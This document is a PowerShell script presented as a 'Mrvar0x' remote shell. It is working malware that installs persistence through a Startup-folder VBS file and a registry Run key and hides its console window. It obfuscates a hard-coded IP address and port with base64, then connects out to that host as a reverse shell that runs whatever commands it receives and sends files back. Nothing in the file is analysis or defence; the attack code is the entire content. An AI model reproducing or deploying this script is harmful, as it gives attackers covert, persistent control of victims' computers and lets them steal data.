# Define paths
$programsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$ps1Path = Join-Path $programsPath "RemoteShell.ps1"
$vbsPath = Join-Path $startupPath "RunHidden.vbs"

# Ensure script persists in ProgramData
$sourcePath = if ($PSCommandPath) { $PSCommandPath } else { $ps1Path }
$persistentPath = "C:\ProgramData\RemoteShell.ps1"
if (Test-Path $sourcePath) {
    if (-not (Test-Path $persistentPath) -or 
        (Get-Item $sourcePath).LastWriteTime -gt (Get-Item $persistentPath).LastWriteTime) {
        
        Copy-Item -Path $sourcePath -Destination $persistentPath -Force
        Write-Host "Copied $sourcePath to $persistentPath"
    } else {
        Write-Host "Persistent copy is up to date."
    }
} else {
    Write-Warning "Source path not found. Saving current script content to $persistentPath."
    $scriptContent = $MyInvocation.MyCommand.ScriptBlock.ToString()
    Set-Content -Path $persistentPath -Value $scriptContent -Force
}

# Create VBS script for hidden execution
$vbsContent = @"
Dim objShell
Set objShell = CreateObject("Wscript.Shell")
appData = objShell.ExpandEnvironmentStrings("%APPDATA%")
psScript = appData & "\Microsoft\Windows\Start Menu\Programs\RemoteShell.ps1"
cmd = "powershell.exe -ExecutionPolicy Bypass -File """ & psScript & """"
objShell.Run cmd, 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Force

# Add to registry for persistence
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "MyScript"
$regValue = "powershell.exe -ExecutionPolicy Bypass -File $persistentPath"
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force

# Function to generate random process name
function Get-RandomProcessName {
    return "PS_" + [System.Guid]::NewGuid().ToString()
}

# Function to run tasks in background
function Run-BackgroundTask {
    param(
        [ScriptBlock]$ScriptBlock,
        [string]$ProcessName
    )
    if (-not $ProcessName) {
        $ProcessName = Get-RandomProcessName
    }
    $JobName = "BackgroundTask_" + [Guid]::NewGuid().ToString()
    Start-Job -Name $JobName -ScriptBlock $ScriptBlock | Out-Null
    $job = Get-Job -Name $JobName
    while ($job.State -eq "Running") {
        Start-Sleep -Milliseconds 500
    }
    $result = $job | Receive-Job
    Remove-Job -Name $JobName -Force | Out-Null
    return $result
}

# File download function
function Download-File($filename) {
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($filename)
        $writer.Write("down:$filename`n")
        $writer.Write([Convert]::ToBase64String($fileBytes))
        $writer.Write("`n")
        $writer.Flush()
    } catch {
        $writer.Write("Err: " + $_.Exception.Message + "`n")
        $writer.Flush()
    }
}

# File upload function
function Upload-File($filePath) {
    try {
        $content = [System.IO.File]::ReadAllBytes($filePath)
        $writer.Write("Upl:Success`n")
        $writer.Write([Convert]::ToBase64String($content))
        $writer.Write("`n")
        $writer.Flush()
    } catch {
        $writer.Write("Err: " + $_.Exception.Message + "`n")
        $writer.Flush()
    }
}

# Show banner
function Show-Banner {
@"
/ | _ __ | |_ () ___ _ __ ___
| | / _ | ' | || |/ _ | ' / |
| || () | | | | |_ | | () | | | _
__/|| ||_|/ |_/|| ||/
| __ __ _ _ __ || _ __ ___ _ __
| / |/ _` | '/ _ | | ' \ / _ \ '|
| |/| | (| | | | () | | |) | __/ |
|| ||_,|| _/|| ./ _||
|_|
Welcome to the Mrvar0x PowerShell Remote Shell!
"@
}

# Hide console window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
public static void Hide()
{
    IntPtr console = GetConsoleWindow();
    if (console != IntPtr.Zero)
    {
        ShowWindow(console, 0);
    }
}'
[Console.Window]::Hide()

# Start VBS script for persistence
Start-Process -FilePath "cscript.exe" -ArgumentList "//nologo", "`"$vbsPath`"" -WindowStyle Hidden

# TCP client setup
$encodedIp = 'MTQzLjExMC4xOTEuMTcx' # 143.110.191.171
$encodedPort = 'NDQ0NA==' # 4444
$ip = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedIp))
$port = [System.Convert]::ToInt32([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPort)))

$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$buffer = New-Object Byte[] 1024
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)

# Redirect console streams
$psI = [System.Console]::In
$psO = [System.Console]::Out
$psE = [System.Console]::Error
[System.Console]::SetIn($reader)
[System.Console]::SetOut($writer)
[System.Console]::SetError($writer)

# Display banner and initial prompt
$shell = "PS " + (Get-Location).Path + "> "
$writer.Write((Show-Banner) + "`n" + $shell)
$writer.Flush()

# Command history
$history = @()

# Main loop for remote shell
while ($true) {
    try {
        $data = $reader.ReadLine()
        $history += $data
        if ($data -eq "exit") { break }
        switch -Regex ($data) {
            'runscript (.+)' {
                $file = $matches[1]
                $scriptContent = [System.IO.File]::ReadAllText($file)
                $output = (Invoke-Expression -Command $scriptContent 2>&1 | Out-String)
            }
            'download (.+)' {
                $file = $matches[1]
                Download-File $file
            }
            'upload (.+)' {
                $file = $matches[1]
                Upload-File $file
            }
            'browse (.+)' {
                $directory = $matches[1]
                if (Test-Path $directory -PathType Container) {
                    $output = Get-ChildItem $directory | Format-Table -AutoSize | Out-String
                } else {
                    $output = "Directory not found"
                }
            }
            default {
                $output = (Invoke-Expression -Command $data 2>&1 | Out-String)
            }
        }
    } catch {
        $output = "Error: " + $_.Exception.Message
    }
    $writer.Write($output + $shell)
    $writer.Flush()
}

# Clean up
$stream.Close()
$client.Close()
